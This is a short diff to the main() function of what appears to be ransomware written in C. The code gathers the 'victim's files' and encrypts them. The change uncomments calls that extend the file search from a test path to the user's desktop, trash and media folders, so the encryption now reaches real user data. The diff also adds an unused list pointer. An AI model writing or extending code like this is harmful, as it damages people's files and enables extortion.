@@ -39,6 +39,7 @@ int main(){
     List *files = NULL;
     List *encrypted = NULL;
     List *not_encrypted = NULL;
+    List *aux;
 
     /* Path variables */
     char * home = get_home_enviroment();
@@ -50,14 +51,13 @@ int main(){
 
     /* finding all victim's files */
     find_files(&files, test_path);
-    //find_files(&files, desktop);
-    //find_files(&files, trash);
-    //find_files(&files, media);
-
+    find_files(&files, desktop);
+    find_files(&files, trash);
+    find_files(&files, media);
+    
     /* start encryption */
     encrypt_files(files, &encrypted, &not_encrypted);
     create_files_desktop(encrypted, files, desktop);
-
     
     /* Free the linked lists*/
     destroy(&files);
